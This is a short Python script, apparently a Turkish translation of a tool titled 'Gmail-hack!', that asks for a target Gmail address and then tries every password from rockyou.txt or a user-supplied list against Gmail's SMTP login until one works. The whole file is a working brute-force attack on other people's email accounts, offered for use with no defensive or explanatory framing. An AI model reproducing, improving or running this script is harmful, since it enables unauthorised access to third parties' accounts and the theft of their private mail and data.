import smtplib
import sys
from os import system
def artwork():
    print("\n")
    print("##########################################################")
    print("#                                                        #")
    print("#                     \||/                               #")
    print("#                     |  @___oo                          #")
    print("#           /\  /\   / (__,,,,|                          #")
    print("#          ) /^\) ^\/ _)              Gmail-hack!        #")
    print("#          )   /^\/   _)              Yazar: d4az        #")
    print("#          )   _ /  / _)              Çeviren: @burkuts  #")
    print("#      /\  )/\/ ||  | )_)                                #")
    print("#     <  >      |(,,) )__)                               #")
    print("#      ||      /    \)___)\                              #")
    print("#      | \____(      )___) )___                          #")
    print("#      \______(_______;;; __;;;                          #")
    print("#                                                        #")
    print("##########################################################")
    print("\n")
    
artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input("Hedef Gmail Adresi Giriniz => ")

print("\n")

pwd = input("Dahili şifre listesini kullanmak için '0' girin \nÖzel bir şifre listesi eklemek için '2' girin\n => ")

if pwd=='0':
    passswfile="rockyou.txt"

elif pwd=='2':
    print("\n")
    passswfile = input("Dosya Yolunu Adlandırın (Parola/Şifre Listesi İçin) => ")

else:
    print("\n")
    print("Geçersiz Giriş!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Şifre Bulun'du %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Şifre Yanlış. %s " % password)

